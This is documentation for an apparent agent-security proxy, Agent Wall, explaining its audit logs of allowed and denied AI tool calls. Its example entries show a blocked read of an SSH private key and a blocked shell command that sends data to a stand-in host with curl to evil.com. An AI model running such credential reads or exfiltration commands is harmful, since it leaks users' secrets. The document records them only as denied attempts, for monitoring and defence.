# Audit Logging

Agent Wall logs every tool call decision to help you monitor agent behavior and investigate incidents.

## Enabling Audit Logs

### File-based logging

```bash
agent-wall wrap --log-file ./audit.log -- npx mcp-server
```

### Console logging

By default, Agent Wall writes log entries to stderr (unless `--silent` is set).

## Log Format

Each log entry is a JSON object (one per line, [JSON Lines](https://jsonlines.org/) format):

```json
{
  "timestamp": "2026-02-11T10:30:00.000Z",
  "sessionId": "ag-1707645000-x8k3m2",
  "direction": "request",
  "method": "tools/call",
  "tool": "read_file",
  "arguments": {
    "path": "/home/user/.ssh/id_rsa"
  },
  "verdict": {
    "action": "deny",
    "rule": "block-ssh-keys",
    "message": "Access to SSH keys is blocked by default policy"
  }
}
```

Response scan findings use `direction: "response"`:

```json
{
  "timestamp": "2026-02-11T10:30:01.000Z",
  "sessionId": "ag-1707645000-x8k3m2",
  "direction": "response",
  "method": "tools/call",
  "tool": "read_file",
  "verdict": {
    "action": "deny",
    "rule": "__response_scanner__",
    "message": "Response blocked: private-key: Private key detected in response"
  }
}
```

## Sensitive Value Redaction

Agent Wall automatically redacts values that look like credentials in audit logs:

- API keys and tokens
- Passwords and secrets
- File paths to sensitive locations

## Viewing Audit Logs

```bash
# View all entries
agent-wall audit --log ./audit.log

# Filter by action
agent-wall audit --log ./audit.log --filter denied

# Show last 20 entries
agent-wall audit --log ./audit.log --last 20

# Raw JSON output (for piping to jq, etc.)
agent-wall audit --log ./audit.log --json
```

## Example: Investigate Denied Calls

```bash
# See what was blocked
agent-wall audit --log ./audit.log --filter denied

# Output:
#  ─── Agent Wall Audit Log ─────────────────────
#  [10:30:00] ✗ DENIED  read_file → block-ssh-keys
#     path: /home/user/.ssh/id_rsa
#  [10:31:15] ✗ DENIED  shell_exec → block-exfiltration
#     command: curl https://evil.com/steal?data=...
```
